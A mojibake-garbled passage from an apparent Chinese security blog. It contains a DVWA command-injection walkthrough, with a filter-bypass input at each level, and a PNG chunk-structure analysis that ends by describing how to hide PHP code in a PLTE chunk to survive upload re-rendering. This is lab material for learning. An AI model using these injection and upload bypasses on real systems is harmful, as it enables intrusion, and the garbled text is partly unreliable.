host</td><td>è¯¥è¿œç¨‹ä¸»æœºçš„åå­—ä¸èƒ½è¢«åŸŸåæœåŠ¡å™¨(DNS)è½¬æ¢æˆIPåœ°å€ã€‚å¯èƒ½æ˜¯åŸŸåæœåŠ¡å™¨æœ‰æ•…éšœï¼Œæˆ–è€…å…¶åå­—ä¸æ­£ç¡®ï¼Œæˆ–è€…ç½‘ç»œç®¡ç†å‘˜çš„ç³»ç»Ÿä¸è¿œç¨‹ä¸»æœºä¹‹é—´çš„é€šä¿¡çº¿è·¯æœ‰æ•…éšœ</td></tr><tr><td>No answer</td><td>æœ¬åœ°ç³»ç»Ÿæœ‰ä¸€æ¡é€šå‘ä¸­å¿ƒä¸»æœºçš„è·¯ç”±ï¼Œä½†å´æ¥æ”¶ä¸åˆ°å®ƒå‘ç»™ä¸­å¿ƒä¸»æœºçš„ä»»ä½•ä¿¡æ¯ã€‚åŸå› å¯èƒ½æ˜¯ï¼šä¸­å¿ƒä¸»æœºæ²¡æœ‰å·¥ä½œ;æœ¬åœ°æˆ–ä¸­å¿ƒä¸»æœºç½‘ç»œé…ç½®ä¸æ­£ç¡®;æœ¬åœ°æˆ–ä¸­å¿ƒçš„è·¯ç”±å™¨æ²¡æœ‰å·¥ä½œ;é€šä¿¡çº¿è·¯æœ‰æ•…éšœ;ä¸­å¿ƒä¸»æœºå­˜åœ¨è·¯ç”±é€‰æ‹©é—®é¢˜</td></tr><tr><td>no rout to host</td><td>ç½‘å¡å·¥ä½œä¸æ­£å¸¸</td></tr><tr><td>transmit fai ledï¼Œerror code</td><td>10043ç½‘å¡é©±åŠ¨ä¸æ­£å¸¸</td></tr><tr><td>unknown host name</td><td>DNSé…ç½®ä¸æ­£ç¡®</td></tr></tbody></table><p>è¯¦æƒ…ï¼š<a href="https://blog.csdn.net/hezeyujiang/article/details/79504038">pingå‘½ä»¤è¯¦è§£</a></p><p>è¾“å…¥ipï¼Œç¨‹åºè°ƒç”¨ç³»ç»Ÿå‘½ä»¤pingè¿™ä¸ªipã€‚åœ¨ipåé¢åŠ <code>&amp;&amp;ã€&amp;ã€|ã€||</code>å‘½ä»¤æ‹¼æ¥ç¬¦å·å†è·Ÿä¸Šè‡ªå·±éœ€è¦æ‰§è¡Œçš„ç³»ç»Ÿå‘½ä»¤å°±æ„æˆäº†å‘½ä»¤æ³¨å…¥</p><table><thead><tr><th style="text-align:center">A&amp;B</th><th style="text-align:center">A&amp;&amp;B</th><th style="text-align:center">A|B</th><th style="text-align:center">A||B</th></tr></thead><tbody><tr><td style="text-align:center">ABä¹‹é—´æ— åˆ¶çº¦å…³ç³»</td><td style="text-align:center">Aæ‰§è¡ŒæˆåŠŸæ‰æ‰§è¡ŒB</td><td style="text-align:center">Açš„è¾“å‡ºä½œä¸ºBçš„è¾“å‡º</td><td style="text-align:center">Aæ‰§è¡Œå¤±è´¥æ‰æ‰§è¡ŒB</td></tr></tbody></table><h2 id="low"><a class="header-anchor" href="#low">ğŸ­</a>low</h2><p>æºç å‡ºç°äº†ä¸€ä¸ªå‡½æ•°ï¼š<code>stristr( php_uname( 's' ), 'Windows NT' )</code></p><p><code>stristr() </code>å‡½æ•°æœç´¢å­—ç¬¦ä¸²åœ¨å¦ä¸€å­—ç¬¦ä¸²ä¸­çš„ç¬¬ä¸€æ¬¡å‡ºç°ï¼Œè¿”å›å­—ç¬¦ä¸²çš„å‰©ä½™éƒ¨åˆ†ï¼ˆä»åŒ¹é…ç‚¹ï¼‰ï¼Œå¦‚æœæœªæ‰¾åˆ°æ‰€æœç´¢çš„å­—ç¬¦ä¸²ï¼Œè¿”å› FALSEã€‚</p><p>æ ¼å¼ï¼š</p><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">stristr</span><span class="hljs-params">(string,search,before_search)</span></span></code></pre><table><thead><tr><th style="text-align:left">å‚æ•°</th><th style="text-align:left">æè¿°</th></tr></thead><tbody><tr><td style="text-align:left"><em>string</em></td><td style="text-align:left">å¿…éœ€ã€‚è§„å®šè¢«æœç´¢çš„å­—ç¬¦ä¸²ã€‚</td></tr><tr><td style="text-align:left"><em>search</em></td><td style="text-align:left">å¿…éœ€ã€‚è§„å®šè¦æœç´¢çš„å­—ç¬¦ä¸²ã€‚å¦‚æœè¯¥å‚æ•°æ˜¯æ•°å­—ï¼Œåˆ™æœç´¢åŒ¹é…è¯¥æ•°å­—å¯¹åº”çš„ ASCII å€¼çš„å­—ç¬¦ã€‚</td></tr><tr><td style="text-align:left"><em>before_search</em></td><td style="text-align:left">å¯é€‰ã€‚é»˜è®¤å€¼ä¸º â€œfalseâ€ çš„å¸ƒå°”å€¼ã€‚å¦‚æœè®¾ç½®ä¸º â€œtrueâ€ï¼Œå®ƒå°†è¿”å› <em>search</em> å‚æ•°ç¬¬ä¸€æ¬¡å‡ºç°ä¹‹å‰çš„å­—ç¬¦ä¸²éƒ¨åˆ†ã€‚</td></tr></tbody></table><p><code>php_uname()</code>:</p><p>è¿”å›è¿è¡Œphpçš„æ“ä½œç³»ç»Ÿçš„ç›¸å…³æè¿°ï¼Œæœ¬å…³å‚æ•°modeå¯å–ï¼š<code>a</code>åŒ…å«æ‰€æœ‰æ¨¡å¼</p><table><thead><tr><th style="text-align:center">s</th><th style="text-align:center">n</th><th style="text-align:center">r</th><th style="text-align:center">v</th><th style="text-align:center">m</th></tr></thead><tbody><tr><td style="text-align:center">æ“ä½œç³»ç»Ÿåç§°</td><td style="text-align:center">ä¸»æœºå</td><td style="text-align:center">ç‰ˆæœ¬</td><td style="text-align:center">ç‰ˆæœ¬ä¿¡æ¯</td><td style="text-align:center">æœºå™¨ç±»å‹</td></tr></tbody></table><p>ä»æºç æ¥çœ‹ï¼Œæœ¬å…³å¯¹ipå‚æ•°å¹¶æœªåšä»»ä½•çš„è¿‡æ»¤ã€‚</p><p>å…ˆæµ‹è¯•ä¸€ä¸‹æœ¬åœ°ç«¯</p><p><img src="/2021/01/26/dvwa4/1.jpg" alt="1"></p><p><code>bytes</code>ï¼šæ•°æ®åŒ…å¤§å°ï¼Œä¹Ÿå°±æ˜¯å­—èŠ‚</p><p><code>time</code>å€¼ï¼šå“åº”å¾€è¿”æ—¶é—´ï¼Œè¿™ä¸ªæ—¶é—´è¶Šå°ï¼Œè¯´æ˜è¿æ¥è¿™ä¸ªåœ°å€é€Ÿåº¦è¶Šå¿«ã€‚</p><p><code>TTL</code>å€¼ï¼š<code>Time To Live</code>,è¡¨ç¤ºDNSè®°å½•åœ¨DNSæœåŠ¡å™¨ä¸Šå­˜åœ¨çš„æ—¶é—´ï¼Œå®ƒæ˜¯IPåè®®åŒ…çš„ä¸€ä¸ªå€¼ï¼Œå‘Šè¯‰è·¯ç”±å™¨è¯¥æ•°æ®åŒ…ä½•æ—¶éœ€è¦è¢«ä¸¢å¼ƒã€‚å¯ä»¥é€šè¿‡Pingè¿”å›çš„TTLå€¼å¤§å°ï¼Œç²—ç•¥åœ°åˆ¤æ–­ç›®æ ‡ç³»ç»Ÿç±»å‹æ˜¯Windowsç³»åˆ—è¿˜æ˜¯UNIX/Linuxç³»åˆ—,<strong>é€šå¸¸æƒ…å†µä¸‹ï¼ŒLinuxç³»ç»Ÿçš„TTLå€¼ä¸º64æˆ–255ï¼ŒWindowsNT/2000/XPç³»ç»Ÿçš„TTLå€¼ä¸º128ï¼ŒWindows98ç³»ç»Ÿçš„TTLå€¼ä¸º32ï¼ŒUNIXä¸»æœºçš„TTLå€¼ä¸º255</strong>ï¼Œä¸Šå›¾ä¸ºLinuxä¸‹çš„æµ‹è¯•ç»“æœã€‚</p><p><code>Sent</code>å‘é€å¤šä¸ªç§’åŒ…ã€</p><p><code>Received </code>æ”¶åˆ°å¤šä¸ªå›åº”åŒ…</p><p><code>Lost </code>ä¸¢å¼ƒäº†å¤šå°‘ä¸ªåŒ…ï¼Œ<code>lost=0</code>æ—¶å³ä¸ºç½‘ç»œçŠ¶æ€è‰¯å¥½</p><p>å“åº”æ—¶é—´<code>Minmum</code> æœ€å°å€¼ã€<code>MAXimun </code>æœ€å¤§å€¼ã€<code>Average </code>å¹³å‡å€¼</p><p>æµ‹çœ‹çœ‹å®ƒèƒ½ä¸èƒ½æ‰§è¡Œä»»æ„å‘½ä»¤:<code>127.0.0.1&amp;&amp;echo å°å¤©æ‰</code></p><img src="/2021/01/26/dvwa4/2.jpg" alt="2" style="zoom:80%;"><p>çœ‹æ¥æ˜¯å¯ä»¥çš„ã€‚æœ¬å…³å¹¶æ— è¿‡æ»¤ï¼Œæ‰§è¡Œå…¶ä»–å‘½ä»¤çš†å¯</p><h2 id="medium"><a class="header-anchor" href="#medium">ğŸ­</a>medium</h2><pre><code class="hljs php">$substitutions = <span class="hljs-keyword">array</span>( <span class="hljs-string">&#x27;&amp;&amp;&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;;&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>, ï¼‰ï¼›</code></pre><p>æºç ä¸­æ‰§è¡Œäº†ä»¥ä¸Šè¿‡æ»¤æ“ä½œï¼Œè·Ÿé»‘åå•å·®ä¸å¤šï¼Œå¯ä½¿ç”¨<code>&amp;</code>,<code>&amp;;&amp;</code>( <code>;</code>ä¼šè¢«æ›¿æ¢ä¸ºç©ºå­—ç¬¦,æ•…æ‰§è¡Œååˆä¼šå˜æˆ<code>&amp;&amp;</code>)</p><h2 id="high"><a class="header-anchor" href="#high">ğŸ­</a>high</h2><pre><code class="hljs php">$substitutions = <span class="hljs-keyword">array</span>( <span class="hljs-string">&#x27;&amp;&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;;&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;|  &#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;-&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;$&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;(&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;)&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;`&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;||&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>, );</code></pre><p>æœ¬å…³åªæ˜¯æŠŠé»‘åå•çš„èŒƒå›´æ‰©å¤§äº†ã€‚ä½†ä»”ç»†è§‚å¯Ÿå¯ä»¥å‘ç°<code>'|  ' =&gt; ''</code>ä¸­|åé¢æœ‰ä¸€ä¸ªç©ºæ ¼ï¼Œæ‰€ä»¥<code>|</code>å¹¶æ²¡æœ‰è¢«è¿‡æ»¤ã€‚</p><h2 id="impossible"><a class="header-anchor" href="#impossible">ğŸ­</a>impossible</h2><p>åˆ†ææºç ï¼š</p><p>ç†Ÿæ‚‰çš„<code>Anti-CSRF token </code>ä¸å†ä»‹ç»ï¼Œæºç ä¸­è¿˜è¿›è¡Œå¦‚ä¸‹é™åˆ¶</p><pre><code class="hljs arcade"><span class="hljs-comment">// Check IF each octet is an integer </span> <span class="hljs-keyword">if</span>( ( is_numeric( <span class="hljs-symbol">$octet</span>[<span class="hljs-number">0</span>] ) ) &amp;&amp; ( is_numeric( <span class="hljs-symbol">$octet</span>[<span class="hljs-number">1</span>] ) ) &amp;&amp; ( is_numeric( <span class="hljs-symbol">$octet</span>[<span class="hljs-number">2</span>] ) ) &amp;&amp; ( is_numeric( <span class="hljs-symbol">$octet</span>[<span class="hljs-number">3</span>] ) ) &amp;&amp; ( sizeof( <span class="hljs-symbol">$octet</span> ) == <span class="hljs-number">4</span> ) ) &#123;      <span class="hljs-comment">// If all 4 octets are int&#x27;s put the IP back together. </span>     <span class="hljs-symbol">$target</span> = <span class="hljs-symbol">$octet</span>[<span class="hljs-number">0</span>] . <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-symbol">$octet</span>[<span class="hljs-number">1</span>] . <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-symbol">$octet</span>[<span class="hljs-number">2</span>] . <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-symbol">$octet</span>[<span class="hljs-number">3</span>];</code></pre><p>åªæœ‰æ•°å­—.æ•°å­—.æ•°å­—.æ•°å­—çš„æ ¼å¼æ‰è¡Œã€‚ç›¸å½“äºé»‘åå•ã€‚</p><p><code>stripslashes()</code>ï¼šåˆ é™¤å­—ç¬¦ä¸²stringä¸­çš„åæ–œæ </p><p><code>is_numeric()</code>å’Œ<code>explode()</code>åœ¨ä¹‹å‰çš„SQLæ³¨å…¥æ¨¡å—éƒ½è®²è¿‡äº†ï¼Œä¸å†èµ˜è¿°ã€‚</p><p>å‘ç°æ¯ä¸ªæ¨¡å—çš„impossibleé‡Œä¼¼ä¹éƒ½æœ‰è¿™å‡ ä¸ªå®¶ä¼™ã€‚</p><h2 id="æ€»ç»“"><a class="header-anchor" href="#æ€»ç»“">ğŸ­</a>æ€»ç»“</h2><p>è™½ç„¶æ­¤æ¼æ´å¾ˆå‰å®³ï¼Œå¯ä»¥ç›´æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œä½†è¿™ä¸ªæ¼æ´åº”è¯¥ä¸å¸¸è§ï¼ˆæ¯•ç«Ÿè¿™ä¹ˆæ˜æ˜¾ï¼Œåˆèƒ½è®©ç”¨æˆ·æ‰§è¡Œcmdï¼‰</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>äºŒæ¬¡æ¸²æŸ“&amp;&amp;pngç»“æ„åˆ†æ</title>
    <link href="/2021/01/24/png/"/>
    <url>/2021/01/24/png/</url>
    
    <content type="html"><![CDATA[<h2 id="ä¸€-PNGçš„æ–‡ä»¶ç»“æ„"><a class="header-anchor" href="#ä¸€-PNGçš„æ–‡ä»¶ç»“æ„">ğŸ­</a>ä¸€.PNGçš„æ–‡ä»¶ç»“æ„</h2><h4 id="æ•°æ®å—æ„æˆç»“æ„"><a class="header-anchor" href="#æ•°æ®å—æ„æˆç»“æ„">ğŸ­</a>æ•°æ®å—æ„æˆç»“æ„</h4><p>pngå®šä¹‰äº†ä¸¤ç§ç±»å‹çš„æ•°æ®å—</p><blockquote><p>å…³é”®æ•°æ®å—(critical chunk)//å…³é”®æ•°æ®å—å®šä¹‰äº†4ä¸ªæ ‡å‡†æ•°æ®å—ï¼Œæ¯ä¸ªPNGæ–‡ä»¶éƒ½å¿…é¡»åŒ…å«å®ƒä»¬ï¼ŒPNGè¯»å†™è½¯ä»¶ä¹Ÿéƒ½å¿…é¡»è¦æ”¯æŒè¿™äº›æ•°æ®å—ã€‚</p></blockquote><blockquote><blockquote><ul><li>PNGæ ‡è¯†ç¬¦</li><li>PNGæ•°æ®å—(IHDR)</li><li>PNGæ•°æ®å—(å…¶ä»–ç±»å‹æ•°æ®å—)</li><li>PNGç»“å°¾æ•°æ®å—(IEND)</li></ul></blockquote></blockquote><blockquote><p>è¾…åŠ©æ•°æ®å—(ancillary chunks)</p></blockquote><h4 id="PNGæ–‡ä»¶æ ¼å¼ä¸­çš„æ•°æ®å—"><a class="header-anchor" href="#PNGæ–‡ä»¶æ ¼å¼ä¸­çš„æ•°æ®å—">ğŸ­</a>PNGæ–‡ä»¶æ ¼å¼ä¸­çš„æ•°æ®å—</h4><table><thead><tr><th><strong>æ•°æ®å—ç¬¦å·</strong></th><th><strong>æ•°æ®å—åç§°</strong></th><th><strong>å¤šæ•°æ®å—</strong></th><th><strong>å¯é€‰å¦</strong></th><th><strong>ä½ç½®é™åˆ¶</strong></th></tr></thead><tbody><tr><td>IHDR</td><td>æ–‡ä»¶å¤´æ•°æ®å—</td><td>å¦</td><td>å¦</td><td>ç¬¬ä¸€å—</td></tr><tr><td>cHRM</td><td>åŸºè‰²å’Œç™½è‰²ç‚¹æ•°æ®å—</td><td>å¦</td><td>æ˜¯</td><td>åœ¨PLTEå’ŒIDATä¹‹å‰</td></tr><tr><td>gAMA</td><td>å›¾åƒÎ³æ•°æ®å—</td><td>å¦</td><td>æ˜¯</td><td>åœ¨PLTEå’ŒIDATä¹‹å‰</td></tr><tr><td>sBIT</td><td>æ ·æœ¬æœ‰æ•ˆä½æ•°æ®å—</td><td>å¦</td><td>æ˜¯</td><td>åœ¨PLTEå’ŒIDATä¹‹å‰</td></tr><tr><td>PLTE</td><td>è°ƒè‰²æ¿æ•°æ®å—</td><td>å¦</td><td>æ˜¯</td><td>åœ¨IDATä¹‹å‰</td></tr><tr><td>bKGD</td><td>èƒŒæ™¯é¢œè‰²æ•°æ®å—</td><td>å¦</td><td>æ˜¯</td><td>åœ¨PLTEä¹‹åIDATä¹‹å‰</td></tr></tbody></table><p>PSï¼šæ•°æ®å—çš„ç±»åˆ«è¿˜æœ‰å¾ˆå¤šï¼Œä»¥ä¸Šåªæ˜¯ä¸€éƒ¨åˆ†ã€‚</p><h4 id="æ•°æ®å—ç»“æ„"><a class="header-anchor" href="#æ•°æ®å—ç»“æ„">ğŸ­</a>æ•°æ®å—ç»“æ„</h4><p>PNGä¸­ï¼Œæ¯ä¸ªæ•°æ®å—ç”±4ä¸ªéƒ¨åˆ†ç»„æˆï¼Œå¦‚ä¸‹ï¼š</p><table><thead><tr><th><strong>åç§°</strong></th><th><strong>å­—èŠ‚æ•°</strong></th><th><strong>è¯´æ˜</strong></th></tr></thead><tbody><tr><td>Length (é•¿åº¦)</td><td>4å­—èŠ‚</td><td>æŒ‡å®šæ•°æ®å—ä¸­æ•°æ®åŸŸçš„é•¿åº¦ï¼Œå…¶é•¿åº¦ä¸è¶…è¿‡(231ï¼1)å­—èŠ‚</td></tr><tr><td>Chunk Type Code (æ•°æ®å—ç±»å‹ç )</td><td>4å­—èŠ‚</td><td>æ•°æ®å—ç±»å‹ç ç”±ASCIIå­—æ¯(A-Zå’Œa-z)ç»„æˆçš„â€œ<strong>æ•°æ®å—ç¬¦å·â€</strong></td></tr><tr><td>Chunk Data (æ•°æ®å—æ•°æ®)</td><td>å¯å˜é•¿åº¦</td><td>å­˜å‚¨æŒ‰ç…§Chunk Type CodeæŒ‡å®šçš„æ•°æ®</td></tr><tr><td>CRC (å¾ªç¯å†—ä½™æ£€æµ‹)</td><td>4å­—èŠ‚</td><td>å­˜å‚¨ç”¨æ¥æ£€æµ‹æ˜¯å¦æœ‰é”™è¯¯çš„å¾ªç¯å†—ä½™ç </td></tr></tbody></table><p>CRC(cyclic redundancy check)åŸŸä¸­çš„å€¼æ˜¯å¯¹Chunk Type CodeåŸŸå’ŒChunk DataåŸŸä¸­çš„æ•°æ®è¿›è¡Œè®¡ç®—å¾—åˆ°çš„ã€‚CRCå€¼ç®—æ³•ï¼š</p><p><img src="/2021/01/24/png/1.jpg" alt="1"></p><h2 id="äºŒ-PNGå›¾åƒæ ‡è¯†ç¬¦"><a class="header-anchor" href="#äºŒ-PNGå›¾åƒæ ‡è¯†ç¬¦">ğŸ­</a>äºŒ.PNGå›¾åƒæ ‡è¯†ç¬¦</h2><p>PNGæ–‡ä»¶å¤´ä½ç½®ç”±ä½å›ºå®šçš„å­—èŠ‚æ¥æè¿°ï¼š</p><table><thead><tr><th>åè¿›åˆ¶æ•°</th><th>137 80 78 71 13 10 26 10</th></tr></thead><tbody><tr><td>åå…­è¿›åˆ¶æ•°</td><td>89 50 4E 47 0D 0A 1A 0A</td></tr></tbody></table><p>PEGï¼ŒPNG,GIF,BMPç­‰å›¾ç‰‡éƒ½å…·æœ‰ä¸åŒçš„å›¾åƒæ ‡è¯†ç¬¦å·ï¼Œåˆ¤æ–­æ–‡ä»¶çš„mimeTypeç±»å‹ï¼Œåº”è¯¥é€šè¿‡æ ‡è¯†ç¬¦,è€Œä¸æ˜¯é€šè¿‡åç¼€ååˆ¤æ–­ï¼Œå› ä¸ºåç¼€åå¯ä»¥éšä¾¿ä¿®æ”¹ï¼ˆä¹‹å‰upload-labsé‡Œæœ‰æåˆ°)</p><h2 id="ä¸‰-æ•°æ®å—"><a class="header-anchor" href="#ä¸‰-æ•°æ®å—">ğŸ­</a>ä¸‰.æ•°æ®å—</h2><h4 id="IHDRæ•°æ®å—"><a class="header-anchor" href="#IHDRæ•°æ®å—">ğŸ­</a>IHDRæ•°æ®å—</h4><p>åŒ…å«æœ‰PNGæ–‡ä»¶ä¸­å­˜å‚¨çš„å›¾åƒæ•°æ®çš„åŸºæœ¬ä¿¡æ¯ï¼Œä¸”ä½œä¸ºç¬¬ä¸€ä¸ªæ•°æ®å—å‡ºç°åœ¨PNGæ•°æ®æµä¸­ï¼Œä¸€ä¸ªPNGæ•°æ®æµä¸­åªèƒ½æœ‰ä¸€ä¸ªæ–‡ä»¶å¤´æ•°æ®å—ã€‚æ–‡ä»¶å¤´æ•°æ®å—ç”±13å­—èŠ‚ç»„æˆï¼Œæ ¼å¼å¦‚ä¸‹:</p><table><thead><tr><th><strong>åŸŸçš„åç§°</strong></th><th><strong>å­—èŠ‚æ•°</strong></th><th><strong>è¯´æ˜</strong></th></tr></thead><tbody><tr><td>Width</td><td>4 bytes</td><td>å›¾åƒå®½åº¦ï¼Œä»¥åƒç´ ä¸ºå•ä½</td></tr><tr><td>Height</td><td>4 bytes</td><td>å›¾åƒé«˜åº¦ï¼Œä»¥åƒç´ ä¸ºå•ä½</td></tr><tr><td>Bit depth</td><td>1 byte</td><td>å›¾åƒæ·±åº¦ï¼š  ç´¢å¼•å½©è‰²å›¾åƒï¼š1ï¼Œ2ï¼Œ4æˆ–8  ç°åº¦å›¾åƒï¼š1ï¼Œ2ï¼Œ4ï¼Œ8æˆ–16  çœŸå½©è‰²å›¾åƒï¼š8æˆ–16</td></tr><tr><td>ColorType</td><td>1 byte</td><td>é¢œè‰²ç±»å‹ï¼š 0ï¼šç°åº¦å›¾åƒ, 1ï¼Œ2ï¼Œ4ï¼Œ8æˆ–16  2ï¼šçœŸå½©è‰²å›¾åƒï¼Œ8æˆ–16  3ï¼šç´¢å¼•å½©è‰²å›¾åƒï¼Œ1ï¼Œ2ï¼Œ4æˆ–8  4ï¼šå¸¦Î±é€šé“æ•°æ®çš„ç°åº¦å›¾åƒï¼Œ8æˆ–16  6ï¼šå¸¦Î±é€šé“æ•°æ®çš„çœŸå½©è‰²å›¾åƒï¼Œ8æˆ–16</td></tr><tr><td>Compression method</td><td>1 byte</td><td>å‹ç¼©æ–¹æ³•(LZ77æ´¾ç”Ÿç®—æ³•)</td></tr><tr><td>Filter method</td><td>1 byte</td><td>æ»¤æ³¢å™¨æ–¹æ³•</td></tr><tr><td>Interlace method</td><td>1 byte</td><td>éš”è¡Œæ‰«ææ–¹æ³•ï¼š 0ï¼šééš”è¡Œæ‰«æ  1ï¼š Adam7(ç”±Adam M. Costelloå¼€å‘çš„7ééš”è¡Œæ‰«ææ–¹æ³•)</td></tr></tbody></table><h4 id="PLTE"><a class="header-anchor" href="#PLTE">ğŸ­</a>PLTE</h4><p>PLTEå®šä¹‰å›¾åƒçš„è°ƒè‰²æ¿ä¿¡æ¯,ä»…ä¸ç´¢å¼•å½©è‰²å›¾åƒæœ‰å…³ï¼Œè€Œä¸”è¦æ”¾åœ¨å›¾åƒæ•°æ®å—ä¹‹å‰ã€‚å®ƒå¯ä»¥åŒ…å«1~256ä¸ªè°ƒè‰²æ¿ä¿¡æ¯ï¼Œæ¯ä¸€ä¸ªè°ƒè‰²æ¿ä¿¡æ¯ç”±3ä¸ªå­—èŠ‚ç»„æˆï¼Œåˆ†åˆ«ä¸ºçº¢é»„è“ï¼Œå„å ä¸€ä¸ªå­—èŠ‚ï¼Œ0æ˜¯ä¸ºé»‘ï¼Œ255ä¸ºæœ€å¤§å€¼ã€‚è°ƒè‰²æ¿PLTEæ•°æ®å—æ˜¯è¾…åŠ©æ•°æ®å—,å¯¹äºç´¢å¼•å›¾åƒï¼Œè°ƒè‰²æ¿ä¿¡æ¯æ˜¯å¿…é¡»çš„ï¼Œè°ƒè‰²æ¿çš„é¢œè‰²ç´¢å¼•ä»0å¼€å§‹ç¼–å·ï¼Œç„¶åæ˜¯1ã€2â€¦â€¦ï¼Œè°ƒè‰²æ¿çš„é¢œè‰²æ•°ä¸èƒ½è¶…è¿‡è‰²æ·±ä¸­è§„å®šçš„é¢œè‰²æ•°ï¼Œå¦åˆ™PNGå›¾åƒä¸åˆæ³•ã€‚</p><h4 id="IDAT"><a class="header-anchor" href="#IDAT">ğŸ­</a>IDAT</h4><p>å›¾åƒæ•°æ®å—IDAT(image data chunk)ï¼šå®ƒå­˜å‚¨å®é™…çš„æ•°æ®ï¼Œåœ¨æ•°æ®æµä¸­å¯åŒ…å«å¤šä¸ªè¿ç»­é¡ºåºçš„å›¾åƒæ•°æ®å—.IDATå­˜æ”¾ç€å›¾åƒçœŸæ­£çš„æ•°æ®ä¿¡æ¯ã€‚</p><h4 id="IEND"><a class="header-anchor" href="#IEND">ğŸ­</a>IEND</h4><p>æ ‡è®°PNGæ–‡ä»¶æˆ–è€…æ•°æ®æµå·²ç»ç»“æŸï¼Œæ”¾åœ¨æ–‡ä»¶çš„å°¾éƒ¨ã€‚æ–‡ä»¶çš„ç»“å°¾12ä¸ªå­—ç¬¦æ€»æ˜¯<code>00 00 00 00 49 45 4E 44 AE 42 60 82 </code>,IENDæ•°æ®å—çš„é•¿åº¦æ€»æ˜¯0ï¼Œæ•°æ®æ ‡è¯†æ€»æ˜¯IEND<code>49 45 4E 44</code>ï¼ˆå‰é¢uploadæœ‰æåˆ°ï¼‰</p><p>ä»¥ä¸‹åˆ†æå®ä¾‹ï¼š</p><img src="/2021/01/24/png/1.png" alt="1" style="zoom:50%;"><p>ä¸Šå›¾ä¸ºpngæ ¼å¼å›¾ç‰‡ï¼Œåå…­è¿›åˆ¶åˆ†æä¸€ä¸‹</p><img src="/2021/01/24/png/2.jpg" alt="2" style="zoom:50%;"><p>å‰å…«ä½ç¬¦åˆpngçš„å¤´æ–‡ä»¶æ ‡è¯†ã€‚</p><img src="/2021/01/24/png/3.jpg" alt="3" style="zoom:50%;"><p>å›¾ç¤ºèŒƒå›´å°±æ˜¯IHDRæ•°æ®å—ï¼Œ</p><ul><li>00 00 00 0D è¯´æ˜IHDRå¤´å—é•¿ä¸º13</li><li>49 48 44 52 IHDRæ ‡è¯†</li><li>00 00 01 94 å›¾åƒçš„å®½ï¼Œ404åƒç´ </li><li>00 00 01 2E å›¾åƒçš„é«˜ï¼Œ302åƒç´ </li><li>08 è‰²æ·±ï¼Œ2^8=256ï¼Œå³è¿™æ˜¯ä¸€ä¸ªæ»¡è‰²çš„å›¾åƒ</li><li>06 é¢œè‰²ç±»å‹ï¼Œç´¢å¼•å›¾åƒ</li><li>00 PNG Specè§„å®šæ­¤å¤„æ€»ä¸º0ï¼ˆé0å€¼ä¸ºå°†æ¥ä½¿ç”¨æ›´å¥½çš„å‹ç¼©æ–¹æ³•é¢„ç•™ï¼‰ï¼Œè¡¨ç¤ºä½¿å‹ç¼©æ–¹æ³•(LZ77æ´¾ç”Ÿç®—æ³•)</li><li>00 åŒä¸Š</li><li>00 ééš”è¡Œæ‰«æ</li><li><code>A9 94 E4 B3 </code>CRCæ ¡éªŒ</li></ul><p>æ¥ä¸‹å»çš„æ•°æ®åˆ°<code>50 4C 54 45 ï¼ˆPLTEæ ‡è¯†ï¼‰</code>å‰5ä¸ªéƒ½ä¸ºæ•°æ®å—sBIT,é¢œè‰²é‡‡æ ·ç‡ã€‚</p><img src="/2021/01/24/png/4.jpg" alt="4" style="zoom: 33%;"><p>PLTEæ ‡è¯†å‰å››ä¸ªä¸ºè°ƒè‰²æ¿ä¿¡æ¯ï¼Œä¹‹åè¿˜ä¼šæœ‰<code>49 44 41 54 IDATæ ‡è¯†</code>,æ–‡ä»¶è¿‡å¤§ä¸ä¸€ä¸€æ‰¾å‡ºï¼Œæœ€åé¢</p><img src="/2021/01/24/png/5.jpg" alt="5" style="zoom:50%;"><p>å¦‚å‰é¢æ‰€è®²ã€‚ç”±äºè¾…åŠ©æ•°æ®å—éƒ½ä¸ºå¯é€‰éƒ¨åˆ†ï¼Œå¯ä»¥é€šè¿‡åˆ é™¤æ‰€æœ‰çš„è¾…åŠ©æ•°æ®å—æ¥å‡å°‘PNGæ–‡ä»¶çš„å¤§å°ã€‚pngä»‹ç»åˆ°è¿™é‡Œç»“æŸï¼Œæ¥ä¸‹æ¥å›å½’upload-17çš„pngäºŒæ¬¡æ¸²æŸ“ç»•è¿‡ã€‚</p><h4 id="å†™å…¥PLTEæ•°æ®å—"><a class="header-anchor" href="#å†™å…¥PLTEæ•°æ®å—">ğŸ­</a>å†™å…¥PLTEæ•°æ®å—</h4><p>phpåº•å±‚å¯¹PLTEæ•°æ®å—è¿›è¡Œäº†CRCæ ¡éªŒ.æ•…å¯å†chunk dataåŸŸæ’å…¥phpä»£ç ,ç„¶åé‡æ–°è®¡ç®—ç›¸åº”çš„crcå€¼å¹¶ä¿®æ”¹ã€‚<strong>æ­¤æ–¹å¼åªå¯¹ç´¢å¼•å½©è‰²å›¾åƒçš„pngå›¾ç‰‡æœ‰æ•ˆ</strong>åœ¨é€‰å–pngå›¾ç‰‡æ—¶å¯æ ¹æ®IHDRæ•°æ®å—çš„color typeè¾¨åˆ«ã€‚å‡è®¾phpä»£ç ä¸º<code>&lt;?php phpinfo();?&gt;</code>è¿›è¡Œåå…­è¿›åˆ¶é€ä¸ªç¼–ç åä¸º<code>3C 3F 70 68 70 20 70 68 70 69 6E 66 6F 28 29 3B 3F 